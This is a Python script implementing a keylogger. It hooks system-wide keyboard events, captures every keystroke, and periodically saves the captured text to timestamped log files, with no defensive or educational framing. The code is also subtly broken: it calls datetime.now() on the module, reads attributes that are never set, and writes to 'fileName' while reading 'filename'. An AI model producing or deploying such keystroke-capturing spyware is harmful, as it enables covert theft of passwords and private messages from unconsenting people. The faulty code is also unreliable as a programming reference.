import datetime
from threading import Timer
import keyboard

class Keylogger:
    def __init__(self, interval=60, reportMethod="file"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
        self.startDatetime = datetime.now()
        self.endDatetime = datetime.now()

    def callback(self, event):
        """
            This callback is invoked whenever a keyboard event is occured
        """
        name = event.name

        if len(name) > 1:
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def report(self):
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.endDatetime = datetime.now()
            self.updateFilename()

            if self.reportMethod == "file":
                self.reportToFile()
            print(f"[{self.filename}] - {self.log}")
            self.startDatetime = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def reportToFile(self):
        """
            This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable
        """
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def start(self):
        self.startDatetime = datetime.now()
        # Start the keylogger
        keyboard.on_release(callback=self.callback)
        # Start reporting the keylogs
        self.report()
        # Make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # Block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    def updateFilename(self):
        """
            Construct the filename to be identified by start & end datetimes
        """
        startDatetimeString = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        endDatetimeString = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.fileName = f"keylog-{startDatetimeString}_{endDatetimeString}"

if __name__ == "__main__":
    Keylogger(
        interval=5,
        reportMethod="file"
    ).start()